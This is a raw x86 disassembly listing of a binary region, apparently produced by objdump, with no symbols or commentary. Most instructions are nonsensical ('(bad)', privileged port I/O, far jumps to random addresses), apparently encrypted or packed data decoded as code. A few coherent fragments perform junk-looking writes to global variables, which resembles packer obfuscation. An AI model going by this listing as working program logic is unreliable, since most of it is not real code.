  4097ae:	pop    ecx
  4097af:	mov    cl,0x9e
  4097b1:	mov    ebx,DWORD PTR [edi-0x7e]
  4097b4:	mov    ch,0xcd
  4097b6:	in     al,dx
  4097b7:	xor    bh,bl
  4097b9:	cmc    
  4097ba:	div    DWORD PTR [esp+eax*1-0x6f4f6d7d]
  4097c1:	adc    DWORD PTR [eax-0x2a821f56],ebp
  4097c7:	call   0xa3b7fb83
  4097cc:	gs (bad) 
  4097ce:	jmp    0x4097a7
  4097d0:	call   0x6bcecf4
  4097d5:	repz xchg ebp,eax
  4097d7:	popw   es
  4097d9:	xchg   edx,eax
  4097da:	lods   eax,DWORD PTR ds:[esi]
  4097db:	mov    bh,0xda
  4097dd:	ins    BYTE PTR es:[edi],dx
  4097de:	ins    BYTE PTR es:[edi],dx
  4097df:	mov    ah,0xc3
  4097e1:	mov    ch,0xcc
  4097e3:	mov    WORD PTR [ecx-0xa],gs
  4097e6:	adc    edi,DWORD PTR cs:[ebx+0x77]
  4097ea:	inc    esp
  4097eb:	shl    eax,cl
  4097ed:	jmp    0x4097e2
  4097ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097f0:	or     esp,DWORD PTR [ecx+0x2fe10487]
  4097f6:	mov    WORD PTR [eax+0x56],ss
  4097f9:	loope  0x40982f
  4097fb:	sub    DWORD PTR [ecx-0x25f6eaa4],ebp
  409801:	push   ss
  409802:	and    bh,ah
  409804:	loop   0x409787
  409806:	jbe    0x409841
  409808:	ror    DWORD PTR [edi+0x31d4cd36],1
  40980e:	pop    esi
  40980f:	pop    ds
  409810:	xor    eax,0x1f2c7331
  409815:	push   ebp
  409816:	out    dx,eax
  409817:	cmp    BYTE PTR [ecx+0x4a],ch
  40981a:	cdq    
  40981b:	(bad)  
  40981c:	rcr    ecx,cl
  40981e:	jg     0x4097db
  409820:	sbb    eax,0x40f49ad6
  409825:	xchg   edx,eax
  409826:	ss in  eax,0x78
  409829:	pusha  
  40982a:	lahf   
  40982b:	out    0x38,eax
  40982d:	push   esi
  40982e:	es test al,0x94
  409831:	fdiv   QWORD PTR [esp+eiz*8+0x58]
  409835:	add    al,0x61
  409837:	or     eax,0xfc8a4125
  40983c:	in     eax,0xb1
  40983e:	add    DWORD PTR [ebx],ebx
  409840:	test   eax,0xd814266e
  409845:	add    bh,bh
  409847:	lea    ebp,ds:0x9bfcb406
  40984d:	pop    esi
  40984e:	jle    0x4097e7
  409850:	ret    0x935
  409853:	dec    esi
  409854:	cmp    eax,0x3b43489c
  409859:	adc    esp,edx
  40985b:	jmp    0x409898
  40985d:	(bad)  
  40985f:	push   0x3252db9e
  409864:	iret   
  409865:	sub    dh,cl
  409867:	push   ss
  409868:	sub    bl,BYTE PTR [edi-0x4caadc73]
  40986e:	dec    edi
  40986f:	stos   BYTE PTR es:[edi],al
  409870:	inc    eax
  409871:	push   0x10
  409873:	pop    edx
  409874:	das    
  409875:	call   0xbc510110
  40987a:	in     eax,dx
  40987b:	xor    edi,DWORD PTR [eax]
  40987d:	xor    bl,ah
  40987f:	fisttp QWORD PTR [edi+0x78]
  409882:	mov    eax,0x5fd94836
  409887:	jbe    0x409877
  409889:	mov    ebx,0xd6e336e0
  40988e:	or     DWORD PTR [esp+edi*8+0x26d9b74e],esp
  409895:	leave  
  409896:	cld    
  409897:	sub    eax,0x9267eeb6
  40989c:	adc    al,0x55
  40989e:	mov    eax,0xdc5a3527
  4098a3:	cwde   
  4098a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098a5:	stos   BYTE PTR es:[edi],al
  4098a6:	dec    edx
  4098a7:	jge    0x4098f3
  4098a9:	js     0x4098b1
  4098ab:	and    BYTE PTR [esp+eiz*4+0x4f],bh
  4098af:	sub    eax,0xa343d017
  4098b4:	jae    0x40988c
  4098b6:	repnz in al,dx
  4098b8:	imul   edi,DWORD PTR [ebx+0x6a],0xadfe434
  4098bf:	(bad)  
  4098c0:	rcr    DWORD PTR [ebp-0x9],cl
  4098c3:	xor    eax,0xb868c98b
  4098c8:	in     al,0xb0
  4098ca:	hlt    
  4098cb:	sti    
  4098cc:	es xor al,0x37
  4098cf:	imul   ebx,DWORD PTR [eax],0x7f
  4098d2:	mov    ebp,0xe70b0e59
  4098d7:	ss xor al,0xce
  4098da:	dec    ecx
  4098db:	mov    eax,ds:0x282e2bca
  4098e0:	xchg   esi,eax
  4098e1:	cwde   
  4098e2:	jle    0x40995c
  4098e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098e5:	adc    eax,0x1bed1526
  4098ea:	lock test cl,cl
  4098ed:	es jmp 0x4098f0
  4098f0:	pusha  
  4098f1:	cdq    
  4098f2:	jg     0x4098dc
  4098f4:	and    bh,al
  4098f6:	mov    dh,0x40
  4098f8:	mov    ecx,0x3b0ab10
  4098fd:	inc    edi
  4098fe:	std    
  4098ff:	test   DWORD PTR [edx],0x412f93f1
  409905:	shl    BYTE PTR [esi-0x33],1
  409908:	ds xor eax,0x5fd7a066
  40990e:	sahf   
  40990f:	ror    edx,0xaf
  409912:	mov    DWORD PTR [edx+ebp*2],edi
  409915:	mov    ds:0x8b00477,al
  40991a:	sbb    BYTE PTR [ebx+esi*1+0x46],0x66
  40991f:	cmp    bl,BYTE PTR [ebx]
  409921:	daa    
  409922:	pop    edi
  409923:	test   eax,0xa6254835
  409928:	rcl    esp,0xcc
  40992b:	fcomp  st(0)
  40992d:	ror    dh,0xba
  409930:	(bad)  
  409931:	out    dx,eax
  409932:	ds ins BYTE PTR es:[edi],dx
  409934:	jae    0x409978
  409936:	lahf   
  409937:	popf   
  409938:	sbb    edx,DWORD PTR [ebp-0x2753b07d]
  40993e:	dec    ebx
  40993f:	inc    eax
  409940:	dec    esp
  409941:	fwait
  409942:	cdq    
  409943:	nop
  409944:	push   edx
  409945:	inc    edx
  409946:	or     al,0xd5
  409948:	aaa    
  409949:	aaa    
  40994a:	pop    ds
  40994b:	jmp    0xbc12d04c
  409950:	sbb    eax,0x5997f90b
  409955:	cmp    DWORD PTR [edx-0x7cd328b4],esi
  40995b:	int    0xd5
  40995d:	(bad)  
  40995e:	pop    edx
  40995f:	mov    al,0xf
  409961:	(bad)  
  409962:	or     eax,0xce73c77e
  409967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409968:	repz fdiv QWORD PTR [edx+ebx*1+0x59]
  40996d:	push   edx
  40996e:	(bad)  
  409970:	dec    edi
  409971:	push   es
  409972:	mov    bl,0xc
  409974:	dec    ecx
  409975:	dec    eax
  409976:	daa    
  409977:	fcomp  QWORD PTR [edi-0x61]
  40997a:	aaa    
  40997b:	jmp    0xf60da5cd
  409980:	cli    
  409981:	mov    edx,0xda72b14c
  409986:	xor    eax,0x4b3bf4d3
  40998b:	shl    DWORD PTR [eax+0x4622209e],1
  409991:	inc    ecx
  409992:	lahf   
  409993:	mov    al,cs:0xafb52500
  409999:	enter  0xc5be,0xb7
  40999d:	mov    edi,0xd395aada
  4099a2:	pop    ecx
  4099a3:	ret    0x4b2b
  4099a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099a7:	dec    eax
  4099a8:	ds mov bh,0x1d
  4099ab:	xchg   DWORD PTR [ebp+0x674f5c48],ebp
  4099b1:	mov    ds:0xeb39ce44,eax
  4099b6:	push   0x7181e0c3
  4099bb:	sbb    dl,BYTE PTR [ebp-0x44]
  4099be:	push   edi
  4099bf:	pushf  
  4099c0:	shr    BYTE PTR [eax+0x51098735],0x89
  4099c7:	adc    eax,0x42a875
  4099cc:	push   ecx
  4099cd:	mov    eax,0x5a3fc9f
  4099d2:	mov    DWORD PTR ds:0x42a885,0x49fb
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a875,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a7f9,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a779
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx+0x6aec14cf]
  409a19:	sbb    DWORD PTR [edi-0x6a],esi
  409a1c:	mov    dh,0xf7
  409a1e:	js     0x409a98
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x4099b5
  409a25:	xor    eax,0x63ccef02
  409a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a2b:	jle    0x409aa6
  409a2d:	frstor [edi+0x3b804e69]
  409a33:	pop    ds
  409a34:	add    DWORD PTR [ecx-0x2d9a5bf7],edx
  409a3a:	mov    WORD PTR [esi],es
  409a3c:	inc    ebx
  409a3d:	aam    0xaa
  409a3f:	into   
  409a40:	imul   edx,edi,0x24
  409a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a44:	cdq    
  409a45:	cmp    bl,dl
  409a47:	inc    esp
  409a48:	fsub   st(4),st
  409a4a:	popf   
  409a4b:	imul   ebp,DWORD PTR [edx-0x23],0xffffffca
  409a4f:	push   ds
  409a50:	out    0x62,al
  409a52:	fs stc 
  409a54:	sbb    esi,DWORD PTR [eax+0x27fc3a61]
  409a5a:	nop
  409a5b:	gs mov bh,0xd1
  409a5e:	popf   
  409a5f:	pop    ebp
  409a60:	cld    
  409a61:	fwait
  409a62:	stos   DWORD PTR es:[edi],eax
  409a63:	aam    0xa2
  409a65:	mov    dh,0x34
  409a67:	dec    esp
  409a68:	adc    al,0x5f
  409a6a:	cmc    
  409a6b:	jae    0x409a71
  409a6d:	test   DWORD PTR [ebx-0x23],esp
  409a70:	(bad)  [eax+0x632951c6]
  409a76:	xchg   edi,eax
  409a77:	pop    ds
  409a78:	punpckhdq mm3,mm7
  409a7b:	fld    DWORD PTR [edi+ebx*2+0x71718cc]
  409a82:	mov    eax,ds:0x36398525
  409a87:	je     0x409a8a
  409a89:	mov    ds:0xeb663938,eax
  409a8e:	cmp    eax,0xd3de1ac4
  409a93:	xor    ah,ch
  409a95:	mov    bh,0xdf
  409a97:	pusha  
  409a98:	mov    ebp,0x272fc73d
  409a9d:	xchg   DWORD PTR [edx+0x5f27a25e],eax
  409aa3:	loope  0x409a58
  409aa5:	adc    al,0xa8
  409aa7:	ds aaa 
  409aa9:	out    dx,al
  409aaa:	retf   0xadb7
  409aad:	cmp    al,0x88
  409aaf:	jge    0x409add
  409ab1:	mov    dh,0x33
  409ab3:	cmp    BYTE PTR ss:[esi],0xd6
  409ab7:	sar    DWORD PTR [esi],cl
  409ab9:	out    0xa7,eax
  409abb:	cmp    DWORD PTR [edx-0x7c91e2a],0xffffffc7
  409ac2:	fwait
  409ac3:	lahf   
  409ac4:	adc    edi,DWORD PTR [edi-0x2b]
  409ac7:	xlat   BYTE PTR ds:[ebx]
  409ac8:	ffreep st(6)
  409aca:	mov    BYTE PTR ds:0x88fde519,dl
  409ad0:	mov    bl,0x97
  409ad2:	xchg   edx,eax
  409ad3:	(bad)  
  409ad4:	lock mov eax,ds:0x553a2cdd
  409ada:	adc    esp,DWORD PTR [eax-0x17]
  409add:	xchg   DWORD PTR [eax-0x51],ebp
  409ae0:	cdq    
  409ae1:	dec    ebp
  409ae2:	test   eax,0x3467f7cd
  409ae7:	ret    
  409ae8:	lock push edi
  409aea:	(bad)  
  409aec:	mov    BYTE PTR [ecx-0x53aed6cf],al
  409af2:	std    
  409af3:	imul   eax,edx,0xe615e948
  409af9:	cld    
  409afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409afb:	cmp    al,0xed
  409afd:	and    ah,BYTE PTR [si+0x38]
  409b01:	adc    DWORD PTR [ebp+0x76],edi
  409b04:	mov    eax,ds:0x55c12cfc
  409b09:	xchg   ebx,eax
  409b0a:	push   edi
  409b0b:	and    ch,0x5d
  409b0e:	jns    0x409b76
  409b10:	xor    eax,0xd4315359
  409b15:	sub    DWORD PTR [ebx-0x58],eax
  409b18:	fisttp WORD PTR [ebx+ecx*1-0x29]
  409b1c:	cmc    
  409b1d:	loop   0x409ad1
  409b1f:	sahf   
  409b20:	push   edi
  409b21:	cmp    ecx,ebp
  409b23:	scas   eax,DWORD PTR es:[edi]
  409b24:	int    0xbd
  409b26:	dec    ecx
  409b27:	out    0xe6,al
  409b29:	loopne 0x409b3e
  409b2b:	inc    edx
  409b2c:	inc    edx
  409b2d:	mov    ds:0xb6c36ba8,eax
  409b32:	inc    esp
  409b33:	mov    ebx,0xdc98b290
  409b38:	(bad)  
  409b39:	in     eax,0x1a
  409b3b:	mov    dl,0x44
  409b3d:	dec    esi
  409b3e:	fnstsw WORD PTR [esi-0x3]
  409b41:	and    ebx,DWORD PTR [edi+ebp*1+0x3b]
  409b45:	or     al,0x4c
  409b47:	mov    bh,0x48
  409b49:	dec    ecx
  409b4a:	sbb    bh,BYTE PTR [ebx-0x369fda3e]
  409b50:	cmp    ebx,esi
  409b52:	xor    BYTE PTR [edi-0x3f647ab7],cl
  409b58:	jp     0x409b33
  409b5a:	pavgw  mm1,QWORD PTR [edi+0x37822562]
  409b61:	jg     0x409b8e
  409b63:	dec    esi
  409b64:	lock mov bl,0x19
  409b67:	aaa    
  409b68:	mov    dh,0xce
  409b6a:	shl    dl,0x67
  409b6d:	inc    esi
  409b6e:	adc    eax,DWORD PTR [esi+edx*1-0x6e]
  409b72:	icebp  
  409b73:	and    eax,0x1032554d
  409b78:	or     esi,edi
  409b7a:	mov    bh,cl
  409b7c:	xor    DWORD PTR [edx+0x16],esp
  409b7f:	xor    dh,ch
  409b81:	pop    ds
  409b82:	adc    eax,0x308eac69
  409b87:	jnp    0x409bb5
  409b89:	adc    BYTE PTR [edi-0x74b3fed8],cl
  409b8f:	fld    st(4)
  409b91:	fistp  QWORD PTR [si+0x12]
  409b95:	daa    
  409b96:	enter  0x1886,0x13
  409b9a:	sbb    DWORD PTR [ebp-0x1e],esi
  409b9d:	mov    dh,dh
  409b9f:	pop    ecx
  409ba0:	retf   0x8ab0
  409ba3:	test   eax,0x772c661c
  409ba8:	pop    eax
  409ba9:	xchg   BYTE PTR [ebx],cl
  409bab:	pop    eax
  409bac:	dec    edx
  409bad:	pop    ecx
  409bae:	fcom   QWORD PTR [ebx]
  409bb0:	out    0xcb,eax
  409bb2:	xchg   edi,eax
  409bb3:	xor    bl,ch
  409bb5:	lods   eax,DWORD PTR ds:[esi]
  409bb6:	cli    
  409bb7:	inc    BYTE PTR ds:0x3723bcbb
  409bbd:	stos   DWORD PTR es:[edi],eax
  409bbe:	pop    esp
  409bc0:	fs popa 
  409bc2:	mov    BYTE PTR [edi-0x80],bh
  409bc5:	jg     0x409bc0
  409bc7:	stos   DWORD PTR es:[edi],eax
  409bc8:	xor    dh,BYTE PTR [eax]
  409bca:	adc    DWORD PTR [ebx],edx
  409bcc:	mov    edx,0x9a4d7d12
  409bd1:	jno    0x409c1f
  409bd3:	adc    DWORD PTR [ebp-0x49],edi
  409bd6:	fist   WORD PTR [esi-0x28c8b33f]
  409bdc:	cmp    eax,0x4a30229c
  409be1:	and    eax,0x3cf4dd81
  409be6:	jle    0x409bbb
  409be8:	sub    DWORD PTR [eax],0xe5a8da4
  409bee:	cmp    eax,0x7e82c2f5
  409bf3:	adc    eax,DWORD PTR [edi]
  409bf5:	lods   eax,DWORD PTR ds:[esi]
  409bf6:	and    ebp,DWORD PTR [eax+0x46]
  409bf9:	mov    ebx,0x7160916b
  409bfe:	leave  
  409bff:	lods   al,BYTE PTR ds:[esi]
  409c00:	sub    al,0x45
  409c02:	dec    esi
  409c03:	outs   dx,DWORD PTR ds:[esi]
  409c04:	adc    DWORD PTR [ebp+0x6],esp
  409c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c08:	push   esp
  409c09:	stc    
  409c0a:	mov    al,0x54
  409c0c:	loope  0x409bb5
  409c0e:	outs   dx,BYTE PTR ds:[esi]
  409c0f:	xchg   esi,eax
  409c10:	js     0x409bc7
  409c12:	pusha  
  409c13:	daa    
  409c14:	cmp    ecx,ebx
  409c16:	adc    BYTE PTR [edx+0x69256bdd],dl
  409c1c:	rcl    BYTE PTR [ebx-0x19],cl
  409c1f:	shr    BYTE PTR [eax+0x24aa89a9],cl
  409c25:	loopne 0x409c74
  409c27:	stc    
  409c28:	mov    ch,0xa4
  409c2a:	dec    esp
  409c2b:	clc    
  409c2c:	sti    
  409c2d:	xchg   ebp,eax
  409c2e:	sti    
  409c2f:	xchg   ebx,eax
  409c30:	fld    DWORD PTR [ebx+ecx*4+0x6]
  409c34:	inc    edi
  409c35:	enter  0x3ee6,0xd3
  409c39:	xchg   BYTE PTR [ecx+0x63],ah
  409c3c:	add    cl,BYTE PTR [edi+0x2795084b]
  409c42:	adc    DWORD PTR [esi+edi*1],edi
  409c45:	jo     0x409c2e
  409c47:	stc    
  409c48:	repnz dec ecx
  409c4a:	fwait
  409c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c4c:	or     BYTE PTR [eax],bl
  409c4e:	fsubp  st(1),st
  409c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c51:	ins    DWORD PTR es:[edi],dx
  409c52:	lods   al,BYTE PTR ds:[esi]
  409c53:	add    BYTE PTR [ebp-0x20],bl
  409c56:	mov    al,ds:0xc908aefe
  409c5b:	push   ss
  409c5c:	mov    DWORD PTR [ebp+0x14],esp
  409c5f:	fist   WORD PTR [ecx+0x70]
  409c62:	cmc    
  409c63:	ror    BYTE PTR [ecx+0x47cf0749],cl
  409c69:	push   ecx
  409c6a:	out    0x66,eax
  409c6c:	test   DWORD PTR [ecx],esi
  409c6e:	ss mov eax,0xc4b73bf6
  409c75:	xchg   esp,eax
  409c76:	xor    DWORD PTR [edx+0x9b8c6a1],0x37f76641
  409c80:	mov    cl,0xcb
  409c82:	into   
  409c83:	and    bh,BYTE PTR [ecx+0x21]
  409c86:	sub    eax,DWORD PTR [eax+0x44bb1689]
  409c8c:	add    eax,0x3854f5c4
  409c91:	scas   eax,DWORD PTR es:[edi]
  409c92:	retf   0xe7
  409c95:	in     eax,0x9a
  409c97:	mov    ch,0xf2
  409c99:	jmp    0xe9fc:0x758f8cbc
  409ca0:	or     esp,esi
  409ca2:	add    BYTE PTR [ebp+0xb],bh
  409ca5:	inc    edi
  409ca6:	xchg   ebx,eax
  409ca7:	push   0x2e
  409ca9:	push   edx
  409caa:	out    0xf4,eax
  409cac:	call   0x6ac600d0
  409cb1:	out    0x67,eax
  409cb3:	ror    DWORD PTR [ebx],0x25
  409cb6:	mov    ebp,0x36aa3d45
  409cbb:	xor    BYTE PTR [ecx-0xb0dc038],dl
  409cc1:	and    eax,DWORD PTR es:[ecx]
  409cc4:	lods   al,BYTE PTR ds:[esi]
  409cc5:	push   0xffffff94
  409cc7:	fcom   DWORD PTR [eax]
  409cc9:	adc    eax,0xbbda5092
  409cce:	data16 (bad) 
  409cd0:	fsub   DWORD PTR [eax+0x17a1a606]
  409cd6:	xor    ebx,DWORD PTR ds:0x143f6be3
  409cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cdd:	push   edi
  409cde:	and    BYTE PTR [ebx+0x2813f559],cl
  409ce4:	repz adc cl,BYTE PTR [esi+0x1594ed4f]
  409ceb:	mov    ds:0xa432adc3,al
  409cf0:	sbb    bl,BYTE PTR [eax+0x65]
  409cf3:	push   ebp
  409cf4:	aam    0xe1
  409cf6:	push   ss
  409cf7:	out    0xbf,al
  409cf9:	ret    
  409cfa:	mov    ax,WORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42a779,0x42a805
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a77d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a841,0x42a83d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a831,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi-0x26341712],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409d23
  409d66:	jp     0x409cff
  409d68:	sub    edi,edx
  409d6a:	dec    esi
  409d6b:	sub    al,0x51
  409d6d:	mov    DWORD PTR ds:0x2a4e72dd,edi
  409d73:	addr16 xchg esp,eax
  409d75:	outs   dx,BYTE PTR ds:[esi]
  409d76:	and    bl,cl
  409d78:	xor    eax,0x42fedf8d
  409d7d:	(bad)  
  409d7e:	jmp    0xc0ab:0x951e0229
  409d85:	fucomip st,st(5)
  409d87:	mov    ch,0x19
  409d89:	jnp    0x409d81
  409d8b:	add    eax,0x9887e69a
  409d90:	mov    eax,0x38cc7ed
  409d95:	pushf  
  409d96:	inc    eax
  409d97:	or     bh,BYTE PTR [edi-0x4c588f96]
  409d9d:	push   ss
  409d9e:	scas   al,BYTE PTR es:[edi]
  409d9f:	dec    esp
  409da0:	mov    ebx,0x9d4cba48
  409da5:	jge    0x409dc5
  409da7:	mov    eax,ds:0xd9db1f4c
  409dac:	and    BYTE PTR [ebp-0x26],al
  409daf:	push   eax
  409db0:	sub    BYTE PTR [edi],0x1b
  409db3:	cs scas eax,DWORD PTR es:[edi]
  409db5:	lea    edx,[esi+0x3a]
  409db8:	loop   0x409dc7
  409dba:	sub    edi,edi
  409dbc:	add    ch,cl
  409dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dbf:	and    ebx,esp
  409dc1:	scas   al,BYTE PTR es:[edi]
  409dc2:	inc    ebp
  409dc3:	jae    0x409d94
  409dc5:	mov    eax,0xd3f7c875
  409dca:	dec    esp
  409dcb:	loope  0x409d6f
  409dcd:	adc    BYTE PTR [edx+eax*8-0x52],ch
  409dd1:	(bad)  
  409dd2:	dec    ebx
  409dd3:	jle    0x409e04
  409dd5:	addr16 ffree st(6)
  409dd8:	cmc    
  409dd9:	fwait
  409dda:	inc    edi
  409ddb:	mov    dl,0x5f
  409ddd:	and    dl,BYTE PTR [esi]
  409ddf:	push   es
  409de0:	mov    cl,0x56
  409de2:	cld    
  409de3:	pop    eax
  409de4:	sar    BYTE PTR [ebp-0x24],1
  409de7:	or     eax,0x22e60fda
  409dec:	shr    DWORD PTR [eax-0x3e],0xef
  409df0:	push   cs
  409df1:	cli    
  409df2:	mov    WORD PTR ds:[ebp+0x181114a2],es
  409df9:	dec    ebx
  409dfa:	and    dl,0x50
  409dfd:	jne    0x409e04
  409dff:	adc    al,0xe
  409e01:	ins    BYTE PTR es:[edi],dx
  409e02:	push   ebp
  409e03:	fisttp QWORD PTR [edx]
  409e05:	and    BYTE PTR [edi],cl
  409e07:	inc    ecx
  409e08:	and    bh,BYTE PTR [esi]
  409e0a:	mov    ecx,0x72a0e7f3
  409e0f:	and    eax,0xdcfa5bcd
  409e14:	jg     0x409ddb
  409e16:	jnp    0x409dc2
  409e18:	idiv   bh
  409e1a:	adc    DWORD PTR [edx+0x1],ebp
  409e1d:	mov    ebp,0x5eb047d
  409e22:	jns    0x409e18
  409e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e25:	test   DWORD PTR ds:0x5164386f,eax
  409e2b:	(bad)  
  409e2c:	ja     0x409dc8
  409e2e:	xchg   ebp,eax
  409e2f:	adc    cl,BYTE PTR [edi]
  409e31:	rcr    BYTE PTR [ebx+0x20],0xbb
  409e35:	mov    ds:0xb81ba263,eax
  409e3a:	test   eax,0xb5e7cbc
  409e3f:	ret    0x9ed5
  409e42:	push   ecx
  409e43:	ins    BYTE PTR es:[edi],dx
  409e44:	jmp    0x474ad899
  409e49:	sbb    edx,edi
  409e4b:	add    ch,BYTE PTR [ebp-0x19c2527e]
  409e51:	jecxz  0x409eb1
  409e53:	jg     0x409e3d
  409e55:	fucomip st,st(4)
  409e57:	pusha  
  409e58:	ds jne 0x409de9
  409e5b:	jecxz  0x409df3
  409e5d:	(bad)  
  409e5e:	and    eax,0x35f83cae
  409e63:	pop    edx
  409e64:	std    
  409e65:	adc    al,al
  409e67:	test   eax,0x834c56c6
  409e6c:	sub    eax,edi
  409e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e6f:	stos   BYTE PTR es:[edi],al
  409e70:	mov    bl,BYTE PTR [edx]
  409e72:	das    
  409e73:	int3   
  409e74:	pop    esi
  409e75:	hlt    
  409e76:	xor    eax,0x2099f7bc
  409e7b:	stos   BYTE PTR es:[edi],al
  409e7c:	push   ebp
  409e7d:	stc    
  409e7e:	imul   ecx,DWORD PTR [ebx+0x15],0xffffffd4
  409e82:	mov    al,ds:0xe580a627
  409e87:	(bad)  
  409e88:	sub    ebx,DWORD PTR [esi-0x52]
  409e8b:	mov    ebx,DWORD PTR [ebx]
  409e8d:	xchg   ebx,eax
  409e8e:	hlt    
  409e8f:	ja     0x278c57ac
  409e95:	(bad)  
  409e96:	and    dl,bh
  409e98:	jbe    0x409e3c
  409e9a:	scas   al,BYTE PTR es:[edi]
  409e9b:	cmc    
  409e9c:	out    0xcb,al
  409e9e:	mov    ebx,0x62a09052
  409ea3:	outs   dx,BYTE PTR ds:[esi]
  409ea4:	sub    edi,esi
  409ea6:	dec    eax
  409ea7:	call   0xee39da26
  409eac:	addr16 aad 0x55
  409eaf:	dec    ecx
  409eb0:	mov    ebp,DWORD PTR [ebx-0x1e6092b4]
  409eb6:	jmp    0x7ae3:0xe3730c01
  409ebd:	mov    dh,0xd9
  409ebf:	ret    0x1079
  409ec2:	fwait
  409ec3:	pop    es
  409ec4:	xor    ebp,DWORD PTR [eax+0x31e631]
  409eca:	shl    BYTE PTR ds:0x5be24a33,1
  409ed0:	push   ecx
  409ed1:	ds pop ecx
  409ed3:	(bad)  
  409ed4:	mov    ?,WORD PTR [ebx]
  409ed6:	and    ebx,DWORD PTR [edx+0x72ca51a0]
  409edc:	inc    esp
  409edd:	xchg   esp,eax
  409ede:	test   ebp,ecx
  409ee0:	retf   
  409ee1:	arpl   WORD PTR [ecx-0x2586577f],sp
  409ee7:	ins    BYTE PTR es:[edi],dx
  409ee8:	inc    ecx
  409ee9:	stos   DWORD PTR es:[edi],eax
  409eea:	je     0x409f30
  409eec:	(bad)  
  409eee:	call   0x6737:0xf8ecb43e
  409ef5:	cli    
  409ef6:	sub    esi,DWORD PTR [esi-0x52]
  409ef9:	push   edi
  409efa:	cmp    edi,DWORD PTR [ebx]
  409efc:	adc    al,BYTE PTR [eax-0x1e]
  409eff:	repnz pop edi
  409f01:	xor    ecx,DWORD PTR [eax+0x53]
  409f04:	mov    bl,0xe0
  409f06:	(bad)  
  409f07:	push   esi
  409f08:	out    0xf9,al
  409f0a:	sbb    eax,esp
  409f0c:	(bad)  
  409f0d:	adc    al,0xb9
  409f0f:	lea    eax,[edx-0x3b]
  409f12:	rcl    edi,0xa4
  409f15:	loope  0x409ef9
  409f17:	sub    al,0xf0
  409f19:	jb     0x409edb
  409f1b:	dec    ebp
  409f1c:	cmp    DWORD PTR [edi],0x8
  409f1f:	iret   
  409f20:	cmc    
  409f21:	push   ds
  409f22:	(bad)
  409f27:	lods   al,BYTE PTR ds:[esi]
  409f28:	(bad)  
  409f29:	imul   ch
  409f2b:	pushf  
  409f2c:	inc    ebx
  409f2d:	jle    0x409fa3
  409f2f:	(bad)  
  409f30:	xchg   ebp,eax
  409f31:	ret    
  409f32:	pop    edx
  409f33:	pushf  
  409f34:	pop    esi
  409f35:	repnz es pop ecx
  409f38:	jns    0x409f26
  409f3a:	popf   
  409f3b:	sbb    dh,dl
  409f3d:	pop    ebp
  409f3e:	mov    bh,0x7d
  409f40:	stos   BYTE PTR es:[edi],al
  409f41:	xchg   dl,cl
  409f43:	shl    ch,0xd9
  409f46:	sub    BYTE PTR [ebp+edx*1+0x159b261a],dh
  409f4d:	lods   al,BYTE PTR ds:[esi]
  409f4e:	(bad)  
  409f4f:	xchg   edx,eax
  409f50:	inc    edi
  409f51:	repnz data16 cmp BYTE PTR [esi],bl
  409f55:	addr16 mov ebp,0xfce7076d
  409f5b:	mov    edx,ecx
  409f5d:	aaa    
  409f5e:	add    eax,0xce89da04
  409f63:	and    ebx,0x27
  409f66:	jmp    0x409fc0
  409f68:	in     eax,0xb4
  409f6a:	cmp    cl,BYTE PTR [edx+0x16d7e64d]
  409f70:	jp     0x409f7d
  409f72:	fwait
  409f73:	jmp    0x301eb5dd
  409f78:	out    0x93,eax
  409f7a:	test   eax,0x66fb62ca
  409f7f:	push   edx
  409f80:	sbb    cl,BYTE PTR [ebx]
  409f82:	out    dx,al
  409f83:	and    DWORD PTR [eax-0x52],ebx
  409f86:	je     0x409f70
  409f88:	popa   
  409f89:	outs   dx,BYTE PTR ds:[esi]
  409f8a:	push   ebx
  409f8b:	sub    ah,BYTE PTR [edx]
  409f8d:	xchg   edx,eax
  409f8e:	inc    ebp
  409f8f:	mov    esp,0x22453167
  409f94:	ins    BYTE PTR es:[edi],dx
  409f95:	add    dh,BYTE PTR ds:0x4db6eea6
